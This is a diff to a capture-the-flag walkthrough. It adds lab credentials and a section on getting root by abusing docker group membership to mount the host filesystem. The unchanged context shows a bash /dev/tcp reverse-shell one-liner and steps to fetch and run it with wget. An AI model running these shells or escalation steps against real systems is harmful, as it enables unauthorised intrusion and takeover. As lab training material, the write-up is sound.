@@ -69,6 +69,8 @@ the unhashed password is **n100906**
 so we have answered the remaining questions, and we have the credentials **r00t:n100906** that work on */partners.html*  
 Great !!!
 
+NOTE : We also get another credentials **admin:mrsheafy**
+
 ---
 
 ## command injection script
@@ -99,7 +101,7 @@ bash -i >& /dev/tcp/<LOCAL_IP>/<LOCAL_PORT> 0>&1
 
 start an http server  
 
-download it on the remote machine with **wget**  
+download it on the remote machine with **wget** 
 
 give permissions to it with ```chmod +x shell.sh```
 
@@ -108,5 +110,24 @@ start a listener on the local port specified
 execute it with ```./shell.sh```
 
 we have a reverse shell on the remote machine !!!
+
+---
+
+## root flag
+
+the last question is What are the first 9 characters of the root user's private SSH key?  
+this is kind of asking for root.txt  
+the last step was completely unnecesary since the credentials for "r00t" work on ssh  
+
+being logged as "r00t" on the machine, we discover he is a member of the group "docker"  
+we can create a docker container that includes the whole filesystem  
+we will be root inside the docker, therefore we are root on the whole filesystem  
+
+the command to achieve this is ```docker run -v /:/mnt -it <image>```, but we need an image  
+we find the images on the system with ```docker images``` and we find one called "bash"  
+we use the above command and now we have a shell in a docker with a folder called */mnt* that includes the whole filesystem  
+and that ends the CTF !!!
+
+aditionally, we could modify the passwd and shadow files to create a new super user  
 
 
